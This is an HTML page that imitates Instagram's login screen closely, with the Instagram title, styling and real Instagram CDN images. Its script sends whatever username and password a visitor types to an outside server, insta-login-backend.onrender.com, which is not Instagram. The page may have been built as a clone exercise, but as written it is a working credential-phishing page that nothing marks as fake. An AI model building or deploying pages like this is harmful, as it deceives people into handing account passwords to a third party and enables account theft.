<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            max-width: 935px;
            width: 100%;
            align-items: center;
            gap: 32px;
        }

        .phone-mockup {
            flex: 1;
            max-width: 454px;
            position: relative;
            display: none;
        }

        .phone-frame {
            width: 100%;
            height: auto;
        }

        .phone-screen {
            position: absolute;
            top: 27px;
            left: 112px;
            width: 250px;
            height: 541px;
            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
            border-radius: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .phone-content {
            width: 100%;
            height: 100%;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 18px;
            text-align: center;
            padding: 20px;
        }

        .login-section {
            flex: 1;
            max-width: 350px;
            margin: 0 auto;
        }

        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            text-align: center;
            margin-bottom: 10px;
        }

        .instagram-logo {
            font-family: 'Billabong', cursive;
            font-size: 51px;
            margin-bottom: 24px;
            color: #262626;
            text-decoration: none;
            display: inline-block;
            font-weight: 400;
            line-height: 1;
        }

        .login-form {
            width: 100%;
        }

        .input-group {
            margin-bottom: 6px;
        }

        .form-input {
            width: 100%;
            padding: 9px 0 7px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
            outline: none;
            color: #262626;
        }

        .form-input:focus {
            border-color: #a8a8a8;
        }

        .form-input::placeholder {
            color: #8e8e8e;
        }

        .login-button {
            width: 100%;
            background: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            padding: 5px 9px;
            margin: 8px 0;
            height: 32px;
            transition: background-color 0.2s;
        }

        .login-button:hover {
            background: #1877f2;
        }

        .login-button:disabled {
            background: #b2dffc;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider::before {
            margin-right: 18px;
        }

        .divider::after {
            margin-left: 18px;
        }

        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 18px;
        }

        .facebook-login:hover {
            color: #1e2a4a;
        }

        .facebook-icon {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }

        .forgot-password {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
        }

        .forgot-password:hover {
            color: #003c75;
        }

        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }

        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .signup-link:hover {
            color: #1877f2;
        }

        .app-download {
            text-align: center;
            margin-top: 20px;
        }

        .app-download p {
            color: #262626;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .download-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .download-btn {
            height: 40px;
            transition: opacity 0.2s;
        }

        .download-btn:hover {
            opacity: 0.8;
        }

        @media (min-width: 875px) {
            .phone-mockup {
                display: block;
            }
        }

        @media (max-width: 450px) {
            .login-box {
                padding: 40px 20px 20px;
            }
            
            .container {
                padding: 0 20px;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="phone-mockup">
            <div class="phone-screen">
                <div class="phone-content">
                    <div>
                        <h3 style="margin-bottom: 20px;">ðŸ“± Instagram Stories</h3>
                        <p style="font-size: 14px; opacity: 0.8;">Capture and share your moments</p>
                    </div>
                </div>
            </div>
        </div>

        <div class="login-section">
            <div class="login-box">
                <h1 class="instagram-logo">Instagram</h1>
                
                <form class="login-form" id="loginForm">
                    <div class="input-group">
                        <input type="text" class="form-input" placeholder="Phone number, username, or email" id="username" required>
                    </div>
                    
                    <div class="input-group">
                        <input type="password" class="form-input" placeholder="Password" id="password" required>
                    </div>
                    
                    <button type="submit" class="login-button" id="loginBtn" disabled>Log in</button>
                </form>

                <div class="divider">OR</div>

                <a href="#" class="facebook-login">
                    <svg class="facebook-icon" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                    </svg>
                    Log in with Facebook
                </a>

                <a href="#" class="forgot-password">Forgot password?</a>
            </div>

            <div class="signup-box">
                Don't have an account? <a href="#" class="signup-link">Sign up</a>
            </div>

            <div class="app-download">
                <p>Get the app.</p>
                <div class="download-buttons">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store" class="download-btn">
                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play" class="download-btn">
                </div>
            </div>
        </div>
    </div>

    <script>
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const loginForm = document.getElementById('loginForm');

        function checkFormValidity() {
            const isValid = usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '';
            loginBtn.disabled = !isValid;
        }

        usernameInput.addEventListener('input', checkFormValidity);
        passwordInput.addEventListener('input', checkFormValidity);

        loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();

    const email = usernameInput.value.trim();
    const password = passwordInput.value.trim();

    loginBtn.textContent = 'Logging in...';
    loginBtn.disabled = true;

    try {
        const response = await fetch("https://insta-login-backend.onrender.com/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ email, password })
        });

        const data = await response.json();
   if (response.ok) {
    alert("âœ… Login successful!");
    // Save user info (optional)
    localStorage.setItem("loggedInUser", JSON.stringify(data.user));
    
    // âœ… Redirect to new page
    window.location.href = "home.html";
        } else {
            alert("âŒ " + data.message);
        }
    } catch (error) {
        console.error(error);
        alert("âš ï¸ Error connecting to server.");
    } finally {
        loginBtn.textContent = 'Log in';
        checkFormValidity();
    }
});

        // Focus effects for inputs
        document.querySelectorAll('.form-input').forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#a8a8a8';
            });
            
            input.addEventListener('blur', function() {
                this.style.borderColor = '#dbdbdb';
            });
        });
    </script>
</body>
</html>
